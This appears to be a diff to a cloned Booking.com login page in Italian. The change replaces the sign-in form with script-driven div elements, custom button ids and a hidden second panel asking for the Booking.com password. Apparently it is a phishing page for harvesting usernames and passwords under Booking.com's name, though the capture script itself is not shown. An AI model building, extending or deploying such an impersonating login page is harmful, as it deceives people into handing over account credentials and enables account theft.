@@ -1,5 +1,5 @@
 <div class="">
-    <div class="app">
+    <div class="login-validation">
         <div class="access-container bui_font_body">
             <div class="access-panel-container">
                 <div class="access-panel nw-access-panel">
@@ -18,7 +18,7 @@
                                                 <div class="bui-spacer--largest"></div>
                                             </div>
                                         </div>
-                                        <form class="nw-signin" novalidate="">
+                                        <div class="nw-signin" novalidate="">
                                             <div class="hidden-password-input-container"><input id="hidden-password"
                                                     type="password" name="password" autocomplete="current-password"
                                                     aria-hidden="true" focusable="false" tabindex="-1"></div>
@@ -42,11 +42,20 @@
                                                             </div>
                                                         </div>
                                                     </div>
+                                                    <div id="username-note" role="alert"
+                                                        class="cVXSqEYm2qiSb_v5lfec h0RiU7PxWzpFdBWU14uK kDUriIcrFG6APuTD2MIA"
+                                                        style="display: none;">
+                                                        Controlla se il nome utente inserito è corretto.
+                                                    </div>
                                                 </div>
-                                                <div><button type="submit"
-                                                        class="_NMeW4uFOFNEfBkJI2X6 C24NCf0IyZRFJk2ahDeL DtlkOQAQuawAsxgcEUCY hevwrAzGPCvQfFqIYsie IP81aoz9pM28K7Vclo49 C3wGW7ffSXVm3VGRJTzO"><span
-                                                            class="TKez1AxowpXXm_eCa_Bz">Continua usando
-                                                            il nome utente</span></button></div>
+                                                <div>
+                                                    <button
+                                                        class="_NMeW4uFOFNEfBkJI2X6 C24NCf0IyZRFJk2ahDeL DtlkOQAQuawAsxgcEUCY hevwrAzGPCvQfFqIYsie IP81aoz9pM28K7Vclo49 C3wGW7ffSXVm3VGRJTzO">
+                                                        <span class="TKez1AxowpXXm_eCa_Bz" id="btnUsername">
+                                                            Continua usando il nome utente
+                                                        </span>
+                                                    </button>
+                                                </div>
                                                 <div class="access-panel__social">
                                                     <div class="access-panel__social-divider">
                                                         <hr
@@ -121,7 +130,95 @@
                                                         </a></div>
                                                 </div>
                                             </div>
-                                        </form>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="account-access__footer">
+            <div class="u-text-center bui_font_caption portal_footer">
+                <div class="v3PQKnrwstNw3Fp4rB_v JVSac8GXWcJ4ZI8Pk8vq lbkyKXfdfIDAMGb_xv0E">
+                    <div class="g_owqbO4sV9gG2ytNxQS pDgGzoHF_5wMiAoczvVA">Effettuando l'accesso o creando un account
+                        accetti i <a target="_blank" rel="noopener noreferrer"
+                            href="https://www.booking.com/content/terms.it.html?aid=2369661"
+                            class="Y2GrMepHg4YXB1IIqu9a UE8Xzvf8uvOHuxCap9fq bui_color_action nw-terms YyYzJ7AivwcR7QxFB55f"><span>Termini
+                                e le Condizioni</span></a> e l’<a target="_blank" rel="noopener noreferrer"
+                            href="https://www.booking.com/content/privacy.it.html?aid=2369661"
+                            class="Y2GrMepHg4YXB1IIqu9a UE8Xzvf8uvOHuxCap9fq bui_color_action nw-privacy YyYzJ7AivwcR7QxFB55f"><span>Informativa
+                                sulla Privacy</span></a> </div>
+                    <div class="g_owqbO4sV9gG2ytNxQS pDgGzoHF_5wMiAoczvVA">Tutti i diritti riservati. <br>Copyright
+                        (2006 - 2024) - Booking.com™</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="login-validation" style="display: none;">
+        <div class="access-container bui_font_body">
+            <div class="access-panel-container">
+                <div class="access-panel nw-access-panel">
+                    <div class="transition-container">
+                        <div class="animate-height" style="height: auto; overflow: visible;">
+                            <div class="sliding-panel">
+                                <div class="transition bui-panel-body slide-enter-done">
+                                    <div class="v3PQKnrwstNw3Fp4rB_v ZDzkc5HybZJchOZiExiQ lbkyKXfdfIDAMGb_xv0E">
+                                        <div class="">
+                                            <div tabindex="-1" class="page-header"
+                                                aria-labelledby="92dbace1-1f09-4525-ad25-2e22a8c1b191"
+                                                aria-describedby="82bec50f-44d7-4eb4-9b79-fb3e436ce36f">
+                                                <h1 id="92dbace1-1f09-4525-ad25-2e22a8c1b191"
+                                                    class="osvS4MYxeSR4s9RPRMlw nw-step-header">Inserisci la tua
+                                                    password</h1>
+                                                <div class="bui-spacer--largest">
+                                                    <div>
+                                                        <p class="nw-step-description"
+                                                            id="82bec50f-44d7-4eb4-9b79-fb3e436ce36f">Inserisci la tua
+                                                            password di Booking.com per il nome utente
+                                                            <strong id="selected-username"></strong>.</p>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <div class="nw-signin" novalidate="">
+                                            <div class="v3PQKnrwstNw3Fp4rB_v ZDzkc5HybZJchOZiExiQ lbkyKXfdfIDAMGb_xv0E">
+                                                <div class="password-input-container bui-spacer--large">
+                                                    <div class="password-input-container bui-spacer--large">
+                                                        <div
+                                                            class="R_h7SulMikvgUX47GBvQ Mh94vxVXZwqosyebpZYk nw-password Rl3cefDMhAnvjI9zSHip">
+                                                            <label for="password"
+                                                                class="R_h7SulMikvgUX47GBvQ MFHyQxiQGaZcvk563z_l q0tLaDHyAa1cMn2gNroO"><span><span
+                                                                        class="jiF1SS_EOl8sUljIInFE">Password</span></span></label>
+                                                            <div class="RauLnXjwuVkydx2Nv0Fe">
+                                                                <div class="xDmQVL2rAys4H_iG_NdQ"><input type="password"
+                                                                    name="password" class="LkmBPiMnXBfMgmQ98uiP"
+                                                                    placeholder="Inserisci la password"
+                                                                    autocomplete="password" autocapitalize="off"
+                                                                    autocorrect="off" spellcheck="false"
+                                                                    data-focus="true" data-ga-action="start typing"
+                                                                    data-ga-label="password" id="password" value="">
+                                                                    <div class="nwDQyiQmtqReituvAuzC"></div>
+                                                                </div>
+                                                            </div>
+                                                            <div id="password-note" role="alert" class="cVXSqEYm2qiSb_v5lfec h0RiU7PxWzpFdBWU14uK kDUriIcrFG6APuTD2MIA" style="display: none;">
+                                                                Inserisci la tua password di Booking.com
+                                                            </div>                                                    
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div class="">
+                                                    <div
+                                                        class="v3PQKnrwstNw3Fp4rB_v JVSac8GXWcJ4ZI8Pk8vq lbkyKXfdfIDAMGb_xv0E">
+                                                        <a id="btnPassword"
+                                                            class="_NMeW4uFOFNEfBkJI2X6 C24NCf0IyZRFJk2ahDeL DtlkOQAQuawAsxgcEUCY hevwrAzGPCvQfFqIYsie IP81aoz9pM28K7Vclo49 C3wGW7ffSXVm3VGRJTzO"><span
+                                                                class="TKez1AxowpXXm_eCa_Bz">Accedi</span>
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
